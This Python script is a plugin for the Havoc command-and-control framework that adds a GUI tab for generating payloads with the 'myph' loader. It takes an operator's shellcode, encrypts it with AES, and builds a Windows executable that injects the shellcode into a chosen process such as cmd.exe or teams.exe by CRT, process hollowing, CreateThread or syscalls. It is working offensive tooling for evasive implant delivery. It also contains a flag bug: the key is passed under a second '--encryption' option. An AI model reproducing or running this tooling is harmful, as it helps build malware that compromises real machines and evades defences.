#!/usr/bin/env python
# -*- Coding: UTF-8 -*-
# Author: @jenaye_fr
# Created on: Mon, 17. Nov 2023
# Description: matro7sh myph Loader support for Havoc C2 framework
# Usage: Load this script into Havoc: Scripts -> Scripts Manager -> Load to create matro7sh Tab

import os
import shutil
import havoc  # type: ignore
import havocui  # type: ignore
from datetime import datetime

# Configuration
LOADER_PATH =  shutil.which("myph")
payload_file_path = "/tmp/payload.bin"

# Variables & Defaults
shellcode_path = ""
myph_key = ""
encryption_kind = "AES"
process_to_inject_to = "cmd.exe"
technique = "CRT"

# Colors
HAVOC_ERROR = "#ff5555" # Red
HAVOC_SUCCESS = "#50fa7b" # Green
HAVOC_COMMENT = "#6272a4" # Greyish blue
HAVOC_DARK = "#555766" # Dark Grey
HAVOC_INFO = "#8be9fd" # Cyan
HAVOC_WARNING = "#ffb86c" # Orange


# Labels
label_to_replace = f"<b style=\"color:{HAVOC_ERROR};\">No shellcode selected.</b>"



if not LOADER_PATH:
    print("[-] Loader not found in $PATH")
    print("Please run script located in install/ directory :)")
    havocui.messagebox("Loader not found in: ", LOADER_PATH)


# Create dialog and log widget
dialog = havocui.Dialog("Matro7sh Myph Payload Generator", True, 670, 400)
log = havocui.Logger("matro7sh myph Log")


techniques = ["CRT", "ProcessHollowing", "CreateThread", "Syscall"]
def change_shellcode_exec_method(num):
    global technique
    if num:
        technique = techniques[num - 1]
    else:
        technique = "CRT"
    print("[*] Shellcode execution method changed: ", technique)


def change_target_process(p):
    global process_to_inject_to
    process_to_inject_to = p
    print("[*] Target process: ", process_to_inject_to)


def change_default_key(k):
    global myph_key
    myph_key = k
    print("[*] Key changed: ", myph_key)


def change_shellcode_path():
    global shellcode_path
    global label_to_replace

    shellcode_path = havocui.openfiledialog("Shellcode path").decode("ascii")
    print("[*] Shellcode path changed: ", shellcode_path, ".")

    formatted_shellcode_path = f"<span style=\"color:{HAVOC_SUCCESS};\">{shellcode_path}</span>"
    dialog.replaceLabel(label_to_replace, formatted_shellcode_path)
    label_to_replace = formatted_shellcode_path if shellcode_path != " " else f"<b style=\"color:{HAVOC_ERROR};\">No shellcode selected.</b>"


# Generate payload
def run():
    def get_build_command() -> str:
        global shellcode_path
        global myph_key
        global technique
        global process_to_inject_to
        global encryption_kind

        base_cmd = f'{LOADER_PATH}'
        if shellcode_path != "":
            base_cmd = f'{base_cmd} --shellcode {shellcode_path}'

        if encryption_kind != "":
            base_cmd = f'{base_cmd} --encryption {encryption_kind}'

        if myph_key != "":
            base_cmd = f'{base_cmd} --encryption {myph_key}'

        if process_to_inject_to != "":
            base_cmd = f'{base_cmd} --process {process_to_inject_to}'

        if technique != "":
            base_cmd = f'{base_cmd} --technique {technique}'

        base_cmd = f'{base_cmd} --out /tmp/myph.exe'
        print(f"[+] Command to be run: {base_cmd}")
        return base_cmd

    def execute():
        log.addText(f"[<span style=\"color:{HAVOC_INFO};\">*</span>] No AES key provide it will be random one.")
        cmd = get_build_command()

        log.addText(f"[+] executing: {cmd}")
        os.system(cmd)


        # Create Log
        log.addText(f"command has been be executed")
        log.addText(f"check client log to see the output")
        log.addText(f"<b style=\"color:{HAVOC_SUCCESS};\">Payload generated successfully at /tmp/myph.exe using myph loader. Happy pwn</b>")
        log.setBottomTab()

    log.setBottomTab()
    log.addText(f"<b style=\"color:{HAVOC_DARK};\">───────────────────────────────────────── running myph ─────────────────────────────────────────</b>")
    log.addText(f"<b style=\"color:{HAVOC_COMMENT};\">{datetime.now().strftime('%d/%m/%Y %H:%M:%S')} </b>")

    if shellcode_path == "":
        havocui.messagebox("Error", "Please specify a valid shellcode path.")
        log.addText(f"[<span style=\"color:{HAVOC_ERROR};\">-</span>] No shellcode file specified.")
        return

    execute()
    dialog.close()


def build():
    dialog.clear()

    # Get Listeners
    global listeners
    listeners = havoc.GetListeners()

    # Build Dialog
    dialog.addLabel(f"<b>──────────────────────────── Required Settings for Myph ─────────────────────────────</b>")
    dialog.addButton("Choose shellcode", change_shellcode_path)
    dialog.addLabel(label_to_replace)

    dialog.addLabel("<b>[*] Shellcode execution method</b>")
    dialog.addCombobox(change_shellcode_exec_method, "CRT", *techniques)

    dialog.addLabel("<b>[*] AES Encryption key (Default: random)</b>")
    dialog.addLineedit("e.g. 0123456789ABCDEF1123345611111111", change_default_key)

    dialog.addLabel("<b>[*] Process to inject to (Default: cmd.exe)</b>")
    dialog.addLineedit("e.g. teams.exe", change_target_process)

    dialog.addButton("Generate", run)
    dialog.exec()



def loader_generator():
    build()

# Create Tab
havocui.createtab("Matro7sh", "myph loader", loader_generator)
